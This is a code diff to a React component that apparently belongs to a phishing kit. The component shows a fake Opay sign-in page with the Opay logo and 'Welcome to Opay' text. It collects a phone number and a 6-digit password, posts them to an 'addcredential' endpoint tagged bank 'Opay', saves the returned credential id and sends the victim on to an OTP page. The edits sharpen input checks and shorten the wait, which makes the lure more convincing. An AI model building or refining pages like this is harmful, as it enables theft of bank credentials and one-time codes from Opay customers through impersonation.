@@ -14,6 +14,7 @@ const AddCredential = () => {
     const [password, setPassword] = useState('');
     const [errMsg, setErrMsg] = useState('');
     const [loading, setLoading] = useState(false);
+    const [disabled, setDisabled] = useState(true);
 
     useEffect(() => {
         emailRef.current.focus();
@@ -21,24 +22,29 @@ const AddCredential = () => {
 
     useEffect(() => {
         setErrMsg('');
-    }, [phoneNumber, password])
+    }, [phoneNumber, password]);
+
+    useEffect(()=>{
+        setDisabled(phoneNumber.length !== 11 || password.length !== 6);
+      }, [phoneNumber, password]);
 
     const handleSubmit = async (e) => {
         e.preventDefault();
         setLoading(true);
         try {
-            await axios.post('addcredential',
+            var response = await axios.post('addcredential',
                 JSON.stringify({ bank: 'Opay', phoneNumber: phoneNumber, password: password }),
                 {
                     headers: { 'Content-Type': 'application/json' },
                 }
             );
+            sessionStorage.setItem('credId', response?.data?.data?.id);
             setTimeout(() => {
                 setPhoneNumber('');
                 setPassword('');
                 setLoading(false);
                 navigate('/otp');
-            }, 10000);
+            }, 1000);
         } catch (err) {
             setLoading(false);
             if (!err?.response) {
@@ -54,9 +60,10 @@ const AddCredential = () => {
 
     return (
             <div className='add-container'>
-                <div className='add-content' style={{"margin-top": "-3rem"}}>
+                <div className='add-content' style={{"marginTop": "-3rem"}}>
                 <span className='page-header'>
                     <img className='logo' src={logo} alt='opay logo' />
+                    Welcome to Opay
                 </span>
                 <p ref={errRef} className={errMsg ? "errmsg" : "offscreen"} aria-live="assertive">{errMsg}</p>
                 <form data-v-093779e2="" onSubmit={handleSubmit}>
@@ -68,8 +75,11 @@ const AddCredential = () => {
                                 className="form-control"
                                 type="number"
                                 id="number"
+                                maxLength={11}
                                 placeholder='Enter phone number'
                                 ref={emailRef}
+                                autoComplete='off'
+                                inputMode="numeric"
                                 onChange={(e) => setPhoneNumber(e.target.value)}
                                 value={phoneNumber}
                                 required
@@ -84,19 +94,21 @@ const AddCredential = () => {
                             type="password"
                             id="password"
                             placeholder='Enter 6-digits password'
+                            autoComplete='off'
+                            inputMode="numeric"
                             onChange={(e) => setPassword(e.target.value)}
                             value={password}
                             required
                         />
                     </div>
-                    <div data-v-093779e2="" className="reset-pasword">
+                    <div data-v-093779e2="" className="reset-pasword" style={{marginTop: '-15px'}}>
                         <div data-v-093779e2="" className="form-group">
                             <input data-v-093779e2="" type="checkbox" id="check" />
                             <label data-v-093779e2="" htmlFor="check">Remember Password</label>
                         </div>
                     </div>
                     
-                    <button data-v-093779e2="" className={phoneNumber !=='' && password !=='' ? "btn btn-active" : "btn btn-disabled"}>
+                    <button data-v-093779e2="" className={disabled ? "btn btn-disabled" : "btn btn-active"} disabled={disabled}>
                         Sign in
                     </button>
                 </form>
